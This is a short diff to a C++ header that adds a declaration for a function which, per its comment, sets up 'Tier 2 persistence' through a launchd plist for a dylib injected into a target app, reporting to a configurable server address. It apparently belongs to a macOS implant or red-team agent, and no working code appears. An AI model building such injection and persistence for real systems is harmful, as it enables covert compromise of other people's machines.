@@ -44,6 +44,10 @@ public:
                                    const std::string& server_ip = "127.0.0.1",
                                    uint16_t server_port = 4242);
 
+    // Tier 2 persistence — launchd plist for injected dylib inside target app
+    static void persistInjectedAgent(const std::string& server_ip,
+                                     uint16_t server_port);
+
 private:
     // FSM Handlers
     void handleInit();
